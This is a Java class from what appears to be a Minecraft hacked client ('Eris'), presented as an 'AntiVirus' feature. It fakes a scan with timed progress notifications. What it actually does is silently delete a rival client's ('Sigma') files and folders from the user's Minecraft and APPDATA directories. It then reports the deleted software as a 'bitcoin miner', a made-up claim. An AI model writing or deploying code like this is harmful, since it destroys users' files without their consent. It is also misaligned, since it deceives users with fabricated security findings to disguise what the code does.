package me.spec.eris.api.antisigma;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import me.spec.eris.Eris;
import me.spec.eris.api.notification.Notification;
import net.minecraft.client.Minecraft;
import net.minecraft.util.EnumChatFormatting;

public class AntiVirus extends Thread {

    @Override
    public void run() {
        try {
            Thread.sleep(2500);
        } catch (InterruptedException e) {
        }

        this.sendMessage("Loading the antivirus database...", 3000);

        try {
            Thread.sleep(6000);
        } catch (InterruptedException e) {
        }

        this.sendMessage("Running checks...", 1000);
        try {
            Thread.sleep(1500);
        } catch (InterruptedException e) {
        }

        boolean sigma = deleteSigma();
        if (sigma) {
            this.sendMessage("Found & deleted bitcoin miner... ID: " + EnumChatFormatting.RED + "Sigma", 3000);
        } else {
            this.sendMessage("No viruses found...", 3000);
        }
    }

    private boolean deleteSigma() {
        Minecraft mc = Minecraft.getMinecraft();
        List<File> directories = Arrays.asList(
                new File(mc.mcDataDir, "sigma"),
                new File(mc.mcDataDir, "sigma5"),
                new File(new File(mc.mcDataDir, "versions"), "sigma5"),
                new File(mc.mcDataDir, "SigmaJelloPrelauncher.jar"));
        File appdata = new File(System.getenv("APPDATA"), ".minecraft");
        if (!mc.mcDataDir.getAbsolutePath().equalsIgnoreCase(appdata.getAbsolutePath())) {
            directories.add(new File(appdata, "sigma"));
            directories.add(new File(appdata, "sigma5"));
            directories.add(new File(new File(appdata, "versions"), "sigma5"));
            directories.add(new File(appdata, "SigmaJelloPrelauncher.jar"));
        }

        //TODO: clean this up lmfao
        //I'm not even gonna bother trying to read this rn
        boolean deleted = false;
        for (File f : directories) {
            if (f.isDirectory()) {
                for (File file1 : f.listFiles()) {
                    deleted = file1.delete();
                }
            }
            f.delete();
        }

        return deleted;
    }

    private void sendMessage(String message, int duration) {
        Eris.INSTANCE.notificationManager.send(new Notification("AntiVirus", message, duration));
    }
}
